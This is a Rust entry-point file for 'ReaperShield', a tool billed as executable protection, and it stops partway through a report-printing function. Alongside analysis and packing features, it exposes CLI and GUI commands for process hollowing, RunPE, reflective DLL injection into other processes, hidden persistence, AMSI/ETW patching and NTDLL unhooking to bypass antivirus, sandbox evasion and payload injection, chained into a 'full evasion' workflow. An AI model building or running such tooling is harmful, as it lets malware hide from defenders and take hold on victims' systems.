// Hide console window in release mode (GUI mode)
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use clap::{Parser, Subcommand};
use reapershield_analyzer::{PeAnalyzer, PeReport};
use reapershield_crypto::CryptoAlgorithm;
use reapershield_hardening::HardeningConfig;
use reapershield_obfuscation::ObfuscationConfig;
use reapershield_packer::{CompressionMethod, Packer, PackedBundle};
use reapershield_reports::{AuditReport, ReportGenerator};
use reapershield_sdk::{ProtectionPipelineConfig, ReaperShieldSdk};
use reapershield_telemetry::TelemetryManager;
use reapershield_evasion::{
    ProcessHollower, ReflectiveLoader, PersistenceEngine, AvEdrBypass,
    SandboxEvasion, InjectionFramework, EvasionEngine,
    RunPeConfig, ReflectiveLoaderConfig, PersistenceConfig, PersistenceTechnique,
    BypassConfig, EvasionConfig, InjectionConfig, InjectionMethod,
};
use reapershield_visualization::{BinaryVisuals, VisualizationEngine};

use std::path::{Path, PathBuf};

#[derive(Parser, Debug)]
#[command(name = "reapershield")]
#[command(author = "ReaperShield Team")]
#[command(version = "0.1.0")]
#[command(about = "ReaperShield Enterprise Executable Protection Platform", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Launch the graphical user interface
    Gui,

    /// Analyze a Windows executable (PE) file for structural security indicators
    Analyze {
        /// Path to the target PE executable
        #[arg(required = true)]
        file: PathBuf,

        /// Output the structural report as raw JSON instead of pretty console layout
        #[arg(long, default_value_t = false)]
        json: bool,
    },

    /// Apply comprehensive, multi-layered enterprise protection to a binary
    Protect {
        /// Path to the source executable
        #[arg(required = true)]
        input: PathBuf,

        /// Path to write the protected executable
        #[arg(long, short)]
        output: Option<PathBuf>,

        /// Password/key for encrypting internal resources and packing payloads
        #[arg(long, short)]
        passphrase: Option<String>,

        /// Enable advanced string and symbol obfuscation
        #[arg(long, default_value_t = true)]
        obfuscate: bool,

        /// Inject anti-tamper runtime checksums
        #[arg(long, default_value_t = true)]
        hardening: bool,

        /// Choose compression strategy (none, zstd, lzma)
        #[arg(long, default_value_t = String::from("zstd"))]
        compression: String,
    },

    /// Apply isolated structural code and layout obfuscation to a binary
    Obfuscate {
        /// Path to the target binary
        #[arg(required = true)]
        file: PathBuf,

        /// Prefix to use when renaming standard PE sections
        #[arg(long, default_value_t = String::from(".reap"))]
        prefix: String,

        /// Add non-crashing CPU junk instruction segments
        #[arg(long, default_value_t = true)]
        junk: bool,

        /// Size in bytes of junk code to inject
        #[arg(long, default_value_t = 512)]
        junk_size: usize,

        /// Enable control flow obfuscation (opaque predicates, bogus jumps)
        #[arg(long, default_value_t = true)]
        control_flow: bool,

        /// Enable import table obfuscation
        #[arg(long, default_value_t = true)]
        imports: bool,

        /// Enable anti-debug stub injection
        #[arg(long, default_value_t = true)]
        anti_debug: bool,

        /// Enable string encryption with runtime decrypt
        #[arg(long, default_value_t = true)]
        string_encrypt: bool,
    },

    /// Apply maximum-strength obfuscation with all techniques enabled
    ObfuscateMax {
        /// Path to the target binary
        #[arg(required = true)]
        file: PathBuf,

        /// Output path for the obfuscated binary
        #[arg(long, short)]
        output: Option<PathBuf>,

        /// XOR encryption key for string obfuscation (hex)
        #[arg(long, default_value_t = String::from("5C"))]
        xor_key: String,
    },

    /// High-ratio asset packaging utility
    Pack {
        /// Path to the target directory containing asset files to compress and pack
        #[arg(required = true)]
        directory: PathBuf,

        /// Output package archive path (.reapack)
        #[arg(long, short)]
        output: PathBuf,

        /// Compression strategy (zstd, lzma)
        #[arg(long, default_value_t = String::from("zstd"))]
        compression: String,

        /// Passphrase to securely encrypt the packed bundle
        #[arg(long)]
        passphrase: Option<String>,
    },

    /// Generate an HTML and JSON audit report for a binary
    Report {
        /// Path to the target executable
        #[arg(required = true)]
        file: PathBuf,

        /// Output directory for audit reports
        #[arg(long, short)]
        out_dir: Option<PathBuf>,
    },

    /// Evasion: Process Hollowing - execute payload in suspended process
    EvasionHollow {
        /// Target executable to hollow
        #[arg(required = true)]
        target: PathBuf,

        /// Payload PE file path
        #[arg(required = true)]
        payload: PathBuf,
    },

    /// Evasion: RunPE - classic PE injection
    EvasionRunpe {
        /// Target executable
        #[arg(required = true)]
        target: PathBuf,

        /// Payload PE file path
        #[arg(required = true)]
        payload: PathBuf,
    },

    /// Evasion: Reflective Loader - manual PE mapping
    EvasionReflective {
        /// Payload PE file path
        #[arg(required = true)]
        payload: PathBuf,

        /// Call entry point after loading
        #[arg(long, default_value_t = true)]
        execute: bool,

        /// Wipe PE headers from memory
        #[arg(long, default_value_t = true)]
        wipe_headers: bool,
    },

    /// Evasion: Reflective DLL Injection
    EvasionReflectiveDll {
        /// Target process PID
        #[arg(required = true)]
        pid: u32,

        /// DLL file path
        #[arg(required = true)]
        dll: PathBuf,
    },

    /// Evasion: Add Persistence
    EvasionPersist {
        /// Target executable path
        #[arg(required = true)]
        target: PathBuf,

        /// Artifact name
        #[arg(required = true)]
        name: String,

        /// Technique (registry_run, registry_runonce, startup_folder, windows_service)
        #[arg(required = true)]
        technique: String,
    },

    /// Evasion: AV/EDR Bypass
    EvasionBypass {
        /// Unhook NTDLL from disk
        #[arg(long, default_value_t = true)]
        unhook_ntdll: bool,

        /// Patch AMSI
        #[arg(long, default_value_t = true)]
        patch_amsi: bool,

        /// Patch ETW
        #[arg(long, default_value_t = true)]
        patch_etw: bool,
    },

    /// Evasion: Sandbox Detection
    EvasionSandbox {
        /// Check CPU count
        #[arg(long, default_value_t = true)]
        check_cpu: bool,

        /// Check memory
        #[arg(long, default_value_t = true)]
        check_memory: bool,

        /// Check disk size
        #[arg(long, default_value_t = true)]
        check_disk: bool,
    },

    /// Evasion: Payload Injection
    EvasionInject {
        /// Target process PID
        #[arg(required = true)]
        pid: u32,

        /// Payload file path
        #[arg(required = true)]
        payload: PathBuf,

        /// Method (classic_dll, apc, thread_hijacking, process_doppelganging)
        #[arg(required = true)]
        method: String,
    },

    /// Evasion: Full Evasion Workflow
    EvasionFull {
        /// Target executable
        #[arg(required = true)]
        target: PathBuf,

        /// Payload file path
        #[arg(required = true)]
        payload: PathBuf,

        /// Enable process hollowing
        #[arg(long, default_value_t = true)]
        hollowing: bool,

        /// Enable persistence
        #[arg(long, default_value_t = true)]
        persistence: bool,

        /// Enable AV/EDR bypass
        #[arg(long, default_value_t = true)]
        bypass: bool,
    },
}

// ── Tauri GUI commands ──────────────────────────────────────────────

/// Open a native OS file-picker for a PE/EXE target. Returns the absolute
/// path of the selected file, or `None` if the user cancelled.
#[tauri::command]
fn tauri_pick_file() -> Result<Option<String>, String> {
    let result = rfd::FileDialog::new()
        .add_filter("PE / Executable", &["exe", "dll", "sys", "ocx", "scr"])
        .add_filter("All files", &["*"])
        .set_title("Select a PE binary to analyze or protect")
        .pick_file();
    Ok(result.map(|p| p.to_string_lossy().to_string()))
}

/// Same as `tauri_pick_file` but for picking the **output** destination.
#[tauri::command]
fn tauri_pick_save_file(suggested_name: Option<String>) -> Result<Option<String>, String> {
    let mut dialog = rfd::FileDialog::new()
        .add_filter("PE / Executable", &["exe", "dll"])
        .set_title("Choose where to save the protected binary");
    if let Some(name) = suggested_name {
        dialog = dialog.set_file_name(&name);
    }
    Ok(dialog.save_file().map(|p| p.to_string_lossy().to_string()))
}

/// Run the SDK protection pipeline and return the full summary (with the
/// new `initial_report`, `final_report`, and `diff` fields populated).
/// This is the preferred command for the GUI — it powers the "Before vs
/// After" comparison panel.
#[tauri::command]
fn tauri_protect_binary_with_diff(
    input_path: String,
    output_path: String,
    config: ProtectionPipelineConfig,
    passphrase: Option<String>,
) -> Result<reapershield_sdk::ProtectionSummary, String> {
    let input_ref = Path::new(&input_path);
    let output_ref = Path::new(&output_path);
    if !input_ref.exists() {
        return Err("Input file does not exist.".to_string());
    }
    let pass_bytes = passphrase.as_ref().map(|p| p.as_bytes());
    ReaperShieldSdk::protect_binary(input_ref, output_ref, &config, pass_bytes)
        .map_err(|e| format!("Protection pipeline failed: {}", e))
}

/// Re-parse a previously protected binary and return its current PeReport —
/// used by the GUI to refresh visuals after protection without re-running
/// the full pipeline.
#[tauri::command]
fn tauri_analyze_buffer_hex(
    file_name: String,
    hex_data: String,
) -> Result<PeReport, String> {
    let bytes = hex::decode(hex_data.trim()).map_err(|e| format!("Invalid hex: {}", e))?;
    PeAnalyzer::analyze_buffer(&bytes, file_name, bytes.len() as u64)
        .map_err(|e| format!("Buffer analysis failed: {}", e))
}

#[tauri::command]
fn tauri_analyze_file(path: String) -> Result<PeReport, String> {
    let path_ref = Path::new(&path);
    if !path_ref.exists() {
        return Err("Target file does not exist.".to_string());
    }
    PeAnalyzer::analyze_file(path_ref).map_err(|e| format!("Analysis failed: {}", e))
}

#[tauri::command]
fn tauri_get_visuals(path: String) -> Result<BinaryVisuals, String> {
    let path_ref = Path::new(&path);
    if !path_ref.exists() {
        return Err("Target file does not exist.".to_string());
    }
    let report = PeAnalyzer::analyze_file(path_ref).map_err(|e| format!("Analysis failed: {}", e))?;
    let buffer = std::fs::read(path_ref).map_err(|e| format!("Failed to read file: {}", e))?;
    Ok(VisualizationEngine::generate_visuals(&buffer, &report))
}

#[tauri::command]
fn tauri_protect_binary(
    input_path: String,
    output_path: String,
    config: ProtectionPipelineConfig,
    passphrase: Option<String>,
) -> Result<reapershield_sdk::ProtectionSummary, String> {
    let input_ref = Path::new(&input_path);
    let output_ref = Path::new(&output_path);
    if !input_ref.exists() {
        return Err("Input file does not exist.".to_string());
    }
    let pass_bytes = passphrase.as_ref().map(|p| p.as_bytes());
    ReaperShieldSdk::protect_binary(input_ref, output_ref, &config, pass_bytes)
        .map_err(|e| format!("Protection pipeline failed: {}", e))
}

#[tauri::command]
fn tauri_generate_report(path: String, out_dir: Option<String>) -> Result<String, String> {
    let file = Path::new(&path);
    if !file.exists() {
        return Err("Target file does not exist.".to_string());
    }
    let report = PeAnalyzer::analyze_file(file).map_err(|e| format!("Analysis failed: {}", e))?;
    let target_directory = out_dir
        .map(PathBuf::from)
        .unwrap_or_else(|| file.parent().unwrap_or(Path::new(".")).to_path_buf());
    let file_stem = file.file_stem().unwrap_or_default().to_string_lossy();
    let telemetry_log = format!("{}_audit.log", file.file_name().unwrap_or_default().to_string_lossy());
    let telemetry_path = file.parent().unwrap_or(Path::new(".")).join(telemetry_log);
    let telemetry_events = TelemetryManager::new(Some(telemetry_path)).read_logs().unwrap_or_default();
    let audit_report = AuditReport {
        report_id: uuid::Uuid::new_v4().to_string()[..8].to_uppercase(),
        created_at: chrono::Utc::now(),
        binary_report: report,
        telemetry_events,
        protection_applied: false,
        compression_ratio: None,
    };
    let html_path = target_directory.join(format!("{}_audit_report.html", file_stem));
    ReportGenerator::generate_html_report(&audit_report, &html_path)
        .map_err(|e| format!("Report compilation failed: {}", e))?;
    Ok(html_path.to_string_lossy().into_owned())
}

#[tauri::command]
fn tauri_get_telemetry(path: String) -> Result<Vec<reapershield_telemetry::TelemetryRecord>, String> {
    let file = Path::new(&path);
    if !file.exists() {
        return Err("Target file does not exist.".to_string());
    }
    let telemetry_log = format!("{}_audit.log", file.file_name().unwrap_or_default().to_string_lossy());
    let telemetry_path = file.parent().unwrap_or(Path::new(".")).join(telemetry_log);
    TelemetryManager::new(Some(telemetry_path))
        .read_logs()
        .map_err(|e| format!("Failed to read telemetry log: {}", e))
}

#[tauri::command]
fn tauri_hollow_process(target_exe: String, payload_path: String) -> Result<String, String> {
    let payload = std::fs::read(&payload_path).map_err(|e| format!("Failed to read payload: {}", e))?;
    ProcessHollower::hollow(&target_exe, &payload)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_runpe(target_exe: String, payload_path: String) -> Result<String, String> {
    let payload = std::fs::read(&payload_path).map_err(|e| format!("Failed to read payload: {}", e))?;
    let config = RunPeConfig { target_exe, payload_path, create_suspended: true, unpatch_ntdll: true, randomize_dll_name: false };
    ProcessHollower::runpe(&config, &payload)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_reflective_load(payload_path: String) -> Result<String, String> {
    let payload = std::fs::read(&payload_path).map_err(|e| format!("Failed to read payload: {}", e))?;
    let config = ReflectiveLoaderConfig { resolve_imports: true, apply_relocations: true, call_entry_point: true, entry_point_arg: None, wipe_headers: true, erase_pe_signature: false };
    ReflectiveLoader::load(&payload, &config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_reflective_dll_inject(pid: u32, dll_path: String) -> Result<String, String> {
    let dll_data = std::fs::read(&dll_path).map_err(|e| format!("Failed to read DLL: {}", e))?;
    ReflectiveLoader::reflective_dll_inject(pid, &dll_data)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_add_persistence(target_path: String, artifact_name: String, technique: String) -> Result<String, String> {
    let tech = match technique.as_str() {
        "registry_run" => PersistenceTechnique::RegistryRun,
        "registry_runonce" => PersistenceTechnique::RegistryRunOnce,
        "startup_folder" => PersistenceTechnique::StartupFolder,
        "windows_service" => PersistenceTechnique::WindowsService,
        _ => return Err("Unknown persistence technique".to_string()),
    };
    let config = PersistenceConfig { technique: tech, target_path, artifact_name, execute_on: "logon".to_string(), hidden: true };
    PersistenceEngine::apply(&config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_av_edr_bypass(unhook_ntdll: bool, patch_amsi: bool, patch_etw: bool) -> Result<String, String> {
    let config = BypassConfig { unhook_ntdll, unhook_kernel32: false, patch_amsi, patch_etw, use_syscall_stub: true, indirect_syscalls: false };
    AvEdrBypass::apply_bypasses(&config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_detect_sandbox() -> Result<String, String> {
    let config = EvasionConfig { check_cpu_count: true, check_memory: true, check_disk_size: true, check_registry_keys: true, check_mac_address: false, check_mouse_movement: false, check_sleep_acceleration: true };
    SandboxEvasion::detect_sandbox(&config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_inject_payload(pid: u32, payload_path: String, method: String) -> Result<String, String> {
    let payload = std::fs::read(&payload_path).map_err(|e| format!("Failed to read payload: {}", e))?;
    let inj_method = match method.as_str() {
        "classic_dll" => InjectionMethod::ClassicDllInjection,
        "apc" => InjectionMethod::ApcInjection,
        "thread_hijacking" => InjectionMethod::ThreadHijacking,
        "process_doppelganging" => InjectionMethod::ProcessDoppelganging,
        _ => return Err("Unknown injection method".to_string()),
    };
    let config = InjectionConfig { target_pid: pid, payload, method: inj_method, execute: true };
    InjectionFramework::inject(&config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

// ── Main ────────────────────────────────────────────────────────────

fn print_help_and_exit() -> ! {
    use clap::CommandFactory;
    let _ = Cli::command().print_help();
    println!();
    std::process::exit(1);
}

fn main() -> anyhow::Result<()> {
    let args = Cli::parse();

    match args.command {
        None => {
            // No subcommand = launch GUI. The Vite-built frontend is embedded
            // into the binary by `tauri::generate_context!()` at compile time,
            // so as long as the Rust build succeeded, the GUI assets are
            // present in this EXE — no runtime file check needed.
            tauri::Builder::default()
                .invoke_handler(tauri::generate_handler![
                    tauri_pick_file,
                    tauri_pick_save_file,
                    tauri_analyze_file,
                    tauri_analyze_buffer_hex,
                    tauri_get_visuals,
                    tauri_protect_binary,
                    tauri_protect_binary_with_diff,
                    tauri_generate_report,
                    tauri_get_telemetry,
                    tauri_hollow_process,
                    tauri_runpe,
                    tauri_reflective_load,
                    tauri_reflective_dll_inject,
                    tauri_add_persistence,
                    tauri_av_edr_bypass,
                    tauri_detect_sandbox,
                    tauri_inject_payload,
                ])
                .run(tauri::generate_context!())
                .expect("error while running tauri application");
        }

        Some(Commands::Gui) => {
            tauri::Builder::default()
                .invoke_handler(tauri::generate_handler![
                    tauri_pick_file,
                    tauri_pick_save_file,
                    tauri_analyze_file,
                    tauri_analyze_buffer_hex,
                    tauri_get_visuals,
                    tauri_protect_binary,
                    tauri_protect_binary_with_diff,
                    tauri_generate_report,
                    tauri_get_telemetry,
                    tauri_hollow_process,
                    tauri_runpe,
                    tauri_reflective_load,
                    tauri_reflective_dll_inject,
                    tauri_add_persistence,
                    tauri_av_edr_bypass,
                    tauri_detect_sandbox,
                    tauri_inject_payload,
                ])
                .run(tauri::generate_context!())
                .expect("error while running tauri application");
        }

        Some(Commands::Analyze { file, json }) => {
            if !file.exists() {
                anyhow::bail!("Error: File does not exist at path {:?}", file);
            }
            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
            println!("[*] Analyzing structural security indicators of PE binary: {:?}", file);
            let report = PeAnalyzer::analyze_file(&file)?;
            if json {
                println!("{}", serde_json::to_string_pretty(&report)?);
            } else {
                print_pretty_report(&report);
            }
        }

        Some(Commands::Protect { input, output, passphrase, obfuscate, hardening, compression }) => {
            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
            if !input.exists() {
                anyhow::bail!("Error: Input file does not exist at path {:?}", input);
            }
            let out_file = output.unwrap_or_else(|| {
                let stem = input.file_stem().unwrap_or_default().to_string_lossy();
                let ext = input.extension().unwrap_or_default().to_string_lossy();
                input.parent().unwrap_or(Path::new(".")).join(format!("{}_protected.{}", stem, ext))
            });
            let comp_method = match compression.to_lowercase().as_str() {
                "lzma" => CompressionMethod::Lzma,
                "zstd" => CompressionMethod::Zstd,
                _ => CompressionMethod::None,
            };
            let config = ProtectionPipelineConfig {
                obfuscation: ObfuscationConfig {
                    encrypt_strings: obfuscate, xor_key: 0x5C, rename_sections: obfuscate,
                    section_prefix: ".reap".to_string(), generate_junk_instructions: obfuscate,
                    junk_size: 512, diversify_layout: obfuscate, control_flow_obfuscation: obfuscate,
                    opaque_predicates: obfuscate, bogus_jumps: obfuscate, import_obfuscation: obfuscate,
                    anti_debug_injection: obfuscate, string_encryption: obfuscate,
                    encrypt_resource_sections: false,
                    mba_obfuscation: obfuscate, api_hashing: obfuscate,
                    api_hash_algorithm: reapershield_obfuscation::ApiHashAlgorithm::Djb2Xor,
                    rc4_strings: false,
                },
                hardening: HardeningConfig {
                    force_dep: hardening, force_aslr: hardening, force_high_entropy_aslr: hardening,
                    force_cfg: hardening, force_integrity_check: hardening, inject_anti_tamper: hardening,
                },
                compression: comp_method,
                encrypt_assets: passphrase.is_some(),
                encryption_algorithm: CryptoAlgorithm::Aes256Gcm,
                generate_reports: true,
            };
            println!("[*] Running ReaperShield Protection Pipeline on {:?}", input);
            let summary = ReaperShieldSdk::protect_binary(&input, &out_file, &config, passphrase.as_ref().map(|s| s.as_bytes()))?;
            println!("\n==================================================");
            println!("   ReaperShield Protection Sequence Successful!   ");
            println!("==================================================");
            println!("Original Binary Size:  {} bytes", summary.original_size);
            println!("Protected Binary Size: {} bytes", summary.protected_size);
            println!("Security Score Shift:  {}% -> {}%", summary.initial_security_score, summary.protected_security_score);
            println!("Total Elapsed Time:    {} ms", summary.elapsed_ms);
            for r_path in &summary.report_paths { println!("  - {:?}", r_path); }
            println!("==================================================");
        }

        Some(Commands::Obfuscate { file, prefix, junk, junk_size, control_flow, imports, anti_debug, string_encrypt }) => {
            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
            if !file.exists() {
                anyhow::bail!("Error: Target file does not exist at path {:?}", file);
            }
            println!("[*] Applying binary obfuscation filters to: {:?}", file);
            let buffer = std::fs::read(&file)?;
            let config = ObfuscationConfig {
                encrypt_strings: string_encrypt, xor_key: 0x5C, rename_sections: !prefix.is_empty(),
                section_prefix: prefix, generate_junk_instructions: junk, junk_size,
                diversify_layout: true, control_flow_obfuscation: control_flow, opaque_predicates: control_flow,
                bogus_jumps: control_flow, import_obfuscation: imports, anti_debug_injection: anti_debug,
                string_encryption: string_encrypt, encrypt_resource_sections: false,
                mba_obfuscation: true, api_hashing: true,
                api_hash_algorithm: reapershield_obfuscation::ApiHashAlgorithm::Djb2Xor,
                rc4_strings: false,
            };
            let out_buffer = reapershield_obfuscation::ObfuscationEngine::apply_obfuscation(&buffer, &config)?;
            let output_path = file.parent().unwrap_or(Path::new(".")).join(format!(
                "{}_obfuscated.exe", file.file_stem().unwrap_or_default().to_string_lossy()
            ));
            std::fs::write(&output_path, &out_buffer)?;
            println!("[+] Obfuscated binary written to: {:?}", output_path);
        }

        Some(Commands::ObfuscateMax { file, output, xor_key }) => {
            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
            if !file.exists() {
                anyhow::bail!("Error: Target file does not exist at path {:?}", file);
            }
            println!("[*] Applying MAXIMUM STRENGTH obfuscation to: {:?}", file);
            let buffer = std::fs::read(&file)?;
            let key = u8::from_str_radix(&xor_key, 16).unwrap_or(0x5C);
            let config = ObfuscationConfig {
                encrypt_strings: true, xor_key: key, rename_sections: true,
                section_prefix: ".reap".to_string(), generate_junk_instructions: true, junk_size: 2048,
                diversify_layout: true, control_flow_obfuscation: true, opaque_predicates: true,
                bogus_jumps: true, import_obfuscation: true, anti_debug_injection: true,
                string_encryption: true, encrypt_resource_sections: true,
                mba_obfuscation: true, api_hashing: true,
                api_hash_algorithm: reapershield_obfuscation::ApiHashAlgorithm::Djb2Xor,
                rc4_strings: true,
            };
            let out_buffer = reapershield_obfuscation::ObfuscationEngine::apply_obfuscation(&buffer, &config)?;
            let output_path = output.unwrap_or_else(|| {
                file.parent().unwrap_or(Path::new(".")).join(format!(
                    "{}_max_obfuscated.exe", file.file_stem().unwrap_or_default().to_string_lossy()
                ))
            });
            std::fs::write(&output_path, &out_buffer)?;
            println!("[+] Maximum obfuscation complete: {:?}", output_path);
            println!("    {} bytes -> {} bytes (+{:.1}%)", buffer.len(), out_buffer.len(),
                ((out_buffer.len() as f64 / buffer.len() as f64) - 1.0) * 100.0);
        }

        Some(Commands::Pack { directory, output, compression, passphrase }) => {
            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
            if !directory.exists() || !directory.is_dir() {
                anyhow::bail!("Error: Source path must be a valid directory. Location: {:?}", directory);
            }
            let mut files_to_pack = Vec::new();
            fn collect_files(dir: &Path, base_dir: &Path, list: &mut Vec<(PathBuf, String)>) -> std::io::Result<()> {
                if dir.is_dir() {
                    for entry in std::fs::read_dir(dir)? {
                        let entry = entry?;
                        let path = entry.path();
                        if path.is_dir() { collect_files(&path, base_dir, list)?; }
                        else {
                            let rel_path = path.strip_prefix(base_dir).unwrap().to_string_lossy().into_owned();
                            list.push((path, rel_path));
                        }
                    }
                }
                Ok(())
            }
            collect_files(&directory, &directory, &mut files_to_pack)?;
            if files_to_pack.is_empty() { anyhow::bail!("Error: Asset directory is empty."); }
            let comp_method = match compression.to_lowercase().as_str() {
                "lzma" => CompressionMethod::Lzma,
                "zstd" => CompressionMethod::Zstd,
                _ => CompressionMethod::None,
            };
            println!("[*] Bundling {} files using {:?}", files_to_pack.len(), comp_method);
            let bundle = Packer::create_bundle(&files_to_pack, comp_method)?;
            let out_bytes = if let Some(pass) = passphrase {
                println!("[*] Encrypting resource bundle with AES-256-GCM...");
                let asset = Packer::encrypt_bundle(&bundle, pass.as_bytes(), CryptoAlgorithm::Aes256Gcm)?;
                asset.to_bytes()?
            } else { serde_json::to_vec(&bundle)? };
            std::fs::write(&output, &out_bytes)?;
            println!("[+] Secure assets bundle written to: {:?}", output);
        }

        Some(Commands::Report { file, out_dir }) => {
            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
            if !file.exists() { anyhow::bail!("Error: Target file does not exist at path {:?}", file); }
            println!("[*] Analyzing target binary: {:?}", file);
            let report = PeAnalyzer::analyze_file(&file)?;
            let target_directory = out_dir.unwrap_or_else(|| file.parent().unwrap_or(Path::new(".")).to_path_buf());
            let file_stem = file.file_stem().unwrap_or_default().to_string_lossy();
            let audit_report = AuditReport {
                report_id: uuid::Uuid::new_v4().to_string()[..8].to_uppercase(),
                created_at: chrono::Utc::now(),
                binary_report: report,
                telemetry_events: TelemetryManager::generate_mock_telemetry(),
                protection_applied: false,
                compression_ratio: None,
            };
            let html_path = target_directory.join(format!("{}_audit_report.html", file_stem));
            ReportGenerator::generate_html_report(&audit_report, &html_path)?;
            println!("[+] HTML audit report written to: {:?}", html_path);
        }

        Some(Commands::EvasionHollow { target, payload }) => {
            if !target.exists() || !payload.exists() { anyhow::bail!("Error: File does not exist"); }
            println!("[*] Process Hollowing: {:?} with payload {:?}", target, payload);
            let payload_data = std::fs::read(&payload)?;
            let result = ProcessHollower::hollow(&target.to_string_lossy(), &payload_data)?;
            println!("[+] Done! PID: {}, TID: {}, Entry: 0x{:X}", result.pid, result.tid, result.entry_point);
        }

        Some(Commands::EvasionRunpe { target, payload }) => {
            if !target.exists() || !payload.exists() { anyhow::bail!("Error: File does not exist"); }
            println!("[*] RunPE: {:?} with payload {:?}", target, payload);
            let payload_data = std::fs::read(&payload)?;
            let config = RunPeConfig { target_exe: target.to_string_lossy().to_string(), payload_path: payload.to_string_lossy().to_string(), create_suspended: true, unpatch_ntdll: true, randomize_dll_name: false };
            let result = ProcessHollower::runpe(&config, &payload_data)?;
            println!("[+] Done! PID: {}, Entry: 0x{:X}", result.pid, result.entry_point);
        }

        Some(Commands::EvasionReflective { payload, execute, wipe_headers }) => {
            if !payload.exists() { anyhow::bail!("Error: Payload file does not exist"); }
            println!("[*] Reflective Loader: {:?}", payload);
            let payload_data = std::fs::read(&payload)?;
            let config = ReflectiveLoaderConfig { resolve_imports: true, apply_relocations: true, call_entry_point: execute, entry_point_arg: None, wipe_headers, erase_pe_signature: false };
            let result = ReflectiveLoader::load(&payload_data, &config)?;
            println!("[+] Done! Entry: 0x{:X}, Image: 0x{:X}", result.entry_point, result.image_base);
        }

        Some(Commands::EvasionReflectiveDll { pid, dll }) => {
            if !dll.exists() { anyhow::bail!("Error: DLL file does not exist"); }
            println!("[*] Reflective DLL Injection into PID {} from {:?}", pid, dll);
            let dll_data = std::fs::read(&dll)?;
            let result = ReflectiveLoader::reflective_dll_inject(pid, &dll_data)?;
            println!("[+] Done! Remote: 0x{:X}", result.image_base);
        }

        Some(Commands::EvasionPersist { target, name, technique }) => {
            if !target.exists() { anyhow::bail!("Error: Target file does not exist"); }
            let tech = match technique.as_str() {
                "registry_run" => PersistenceTechnique::RegistryRun,
                "registry_runonce" => PersistenceTechnique::RegistryRunOnce,
                "startup_folder" => PersistenceTechnique::StartupFolder,
                "windows_service" => PersistenceTechnique::WindowsService,
                _ => anyhow::bail!("Unknown technique: {}", technique),
            };
            let config = PersistenceConfig { technique: tech, target_path: target.to_string_lossy().to_string(), artifact_name: name, execute_on: "logon".to_string(), hidden: true };
            let result = PersistenceEngine::apply(&config)?;
            println!("[+] Persistence added: {} at {}", result.technique, result.location);
        }

        Some(Commands::EvasionBypass { unhook_ntdll, patch_amsi, patch_etw }) => {
            println!("[*] AV/EDR Bypass");
            let config = BypassConfig { unhook_ntdll, unhook_kernel32: false, patch_amsi, patch_etw, use_syscall_stub: true, indirect_syscalls: false };
            let result = AvEdrBypass::apply_bypasses(&config)?;
            println!("[+] Bypassed {} modules: {}", result.bypassed_count, result.details);
        }

        Some(Commands::EvasionSandbox { check_cpu, check_memory, check_disk }) => {
            println!("[*] Sandbox Detection");
            let config = EvasionConfig { check_cpu_count: check_cpu, check_memory, check_disk_size: check_disk, check_registry_keys: true, check_mac_address: false, check_mouse_movement: false, check_sleep_acceleration: true };
            let result = SandboxEvasion::detect_sandbox(&config)?;
            println!("[+] Is Sandbox: {} (confidence: {:.0}%)", result.is_sandbox, result.confidence * 100.0);
            for ind in &result.detected_indicators { println!("    - {}", ind); }
        }

        Some(Commands::EvasionInject { pid, payload, method }) => {
            if !payload.exists() { anyhow::bail!("Error: Payload file does not exist"); }
            let payload_data = std::fs::read(&payload)?;
            let inj_method = match method.as_str() {
                "classic_dll" => InjectionMethod::ClassicDllInjection,
                "apc" => InjectionMethod::ApcInjection,
                "thread_hijacking" => InjectionMethod::ThreadHijacking,
                "process_doppelganging" => InjectionMethod::ProcessDoppelganging,
                _ => anyhow::bail!("Unknown method: {}", method),
            };
            let config = InjectionConfig { target_pid: pid, payload: payload_data, method: inj_method, execute: true };
            let result = InjectionFramework::inject(&config)?;
            println!("[+] Injected! Address: 0x{:X}, Technique: {}", result.remote_address, result.technique);
        }

        Some(Commands::EvasionFull { target, payload, hollowing, persistence, bypass }) => {
            if !target.exists() || !payload.exists() { anyhow::bail!("Error: File does not exist"); }
            println!("[*] Full Evasion Workflow");
            let payload_data = std::fs::read(&payload)?;
            let result = EvasionEngine::execute_full_evasion(&target.to_string_lossy(), &payload_data, hollowing, persistence, bypass)?;
            println!("[+] Complete! Timestamp: {}", result.timestamp);
            if let Some(h) = &result.hollowing { println!("    Hollowing: PID {}", h.pid); }
            if let Some(p) = &result.persistence { println!("    Persistence: {} at {}", p.technique, p.location); }
            if let Some(b) = &result.bypass { println!("    Bypass: {} bypassed", b.bypassed_count); }
        }
    }

    Ok(())
}

fn print_pretty_report(report: &PeReport) {
    println!("\n==================================================");
    println!("   ReaperShield Binary Security Analysis          ");
    println!("==================================================");
    println!("File Name:     {}", report.file_name);
    println!("File Size:     {} bytes", report.file_size);
    println!("Security Score: {}/100", report.security_score);
    println!("Architecture:   {}", if report.is_64_bit { "64-bit (x86_64)" } else { "32-bit (x86)" });
    println!("Entry Point:    0x{:08X}", report.entry_point);
    println!("Global Entropy: {:.4}", report.global_entropy);
    println!("Packer Status:  {}", if report.packer_detected { "PACKED / CRYPTED" } else { "NONE DETECTED" });
